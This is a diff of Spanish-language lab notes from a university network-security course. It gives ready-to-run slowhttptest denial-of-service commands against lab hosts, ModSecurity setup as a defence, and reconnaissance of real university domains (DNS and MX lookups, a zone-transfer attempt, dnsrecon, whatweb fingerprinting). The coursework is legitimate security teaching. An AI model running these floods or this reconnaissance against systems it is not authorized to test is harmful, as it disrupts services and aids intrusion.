@@ -387,15 +387,126 @@ slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.11.48
 
 ***o) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?***
 
+https://www.linode.com/docs/guides/securing-apache2-with-modsecurity/ -> seguir enlace,desactivar ossec, sino banean IPs
+
+**deshabilita el módulo**
+
+```
+a2dismod security2
+```
+**habilita el módulo**
+
+```
+a2enmod security2
+```
+
+curl http://10.11.48.27/ -> victima/atacante
+
+**ATAQUE DE SLOW HEADERS:** 
+
+```
+slowhttptest -c 1000 -H -g -i 10 -r 200 -t GET -u http://10.11.48.x -x 24 -p 3
+```
+
+**ATAQUE DE SLOWBODY:**
+
+```
+slowhttptest -c 1000 -B -g -i 110 -r 200 -s 8192 -t FAKEVERB -u http://10.11.48.x -x 10 -p 3
+```
+
+**ATAQUE DE SLOWREAD:**
+
+```
+slowhttptest -c 1000 -g -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.11.48.x -p 3
+```
+
+
+perl /usr/share/doc/libapache2-mod-evasive/examples/test.pl
+tail -f /var/log/apache2/error.log -> comprueba los accesos a la máquina
+
+
 ***p) Buscamos información.:***
 
 ***• Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.***
 
+```
+host udc.es
+
+```
+
+**Info**
+
+Rango de direccionamineto IPv4 de la UDC:
+
+https://apps.db.ripe.net/db-web-ui/query?searchtext=193.144.53.84
+
+Mas info de la UDC: 
+
+https://ip6.nl/#!udc.es
+
+Info del dominio de udc.es (tenemos que buscarlo)
+
+https://www.nic.es/sgnd/dominio/publicBuscarDominios.action
+
+Resolución inversa:
+
+```
+
+host 8.8.8.8
+
+```
+
 ***• Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.***
+
+Primero instalamos:
+
+```
+apt-get install dnsutils
+```
+
+MX:
+```
+nslookup -query=mx udc.es
+```
+DNS:
+```
+nslookup -type=NS udc.es
+```
 
 ***• ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.***
 
+No podemos hacerlo, No se puede realizar una transferencia de zona sobre los servidores DNS porque están configurados para eso.
+
+```
+dig @10.11.48.27 axfr udc.es
+```
+
+Como no podemos hacerla, para obtener dotos los nombres.dominio de la UDC:
+
+```
+dnsrecon -d udc.es
+```
+
 ***• ¿Qué gestor de contenidos se utiliza en www.usc.es?***
+
+Un CMS crea, administra y actualiza una página web
+
+Instalamos:
+
+```
+apt install whatweb
+```
+
+Para ver el gestor de contenidos:
+
+```
+whatweb www.usc.es
+```
+
+
+nslookup 8.8.8.8
+
+
 
 ***q) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.***
 
